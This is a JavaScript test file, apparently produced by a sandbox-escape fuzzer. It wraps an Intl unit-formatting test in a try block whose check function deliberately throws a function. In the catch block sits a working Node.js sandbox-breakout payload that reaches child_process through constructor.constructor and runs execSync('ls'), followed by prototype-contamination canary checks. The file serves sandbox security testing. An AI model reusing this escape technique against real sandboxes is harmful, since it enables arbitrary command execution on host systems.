try {
    function check(unit) {
        throw () => {
            return () => {
            };
        };
        const s1 = 123 .toLocaleString(undefined, {
            style: 'unit',
            unit: unit
        });
        const s2 = 123 .toLocaleString();
        assert.notSameValue(s1, s2);
    }
    const units = [
        'acre',
        'bit',
        'byte',
        'celsius',
        'centimeter',
        'day',
        'degree',
        'fahrenheit',
        'fluid-ounce',
        'foot',
        'gallon',
        'gigabit',
        'gigabyte',
        'gram',
        'hectare',
        'hour',
        'inch',
        'kilobit',
        'kilobyte',
        'kilogram',
        'kilometer',
        'liter',
        'megabit',
        'megabyte',
        'meter',
        'mile',
        'mile-scandinavian',
        'millimeter',
        'milliliter',
        'millisecond',
        'minute',
        'month',
        'ounce',
        'percent',
        'petabyte',
        'pound',
        'second',
        'stone',
        'terabit',
        'terabyte',
        'week',
        'yard',
        'year'
    ];
    for (const simpleUnit of units) {
        check(simpleUnit);
        for (const simpleUnit2 of units) {
            check(simpleUnit + '-per-' + simpleUnit2);
            check(simpleUnit2 + '-per-' + simpleUnit);
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}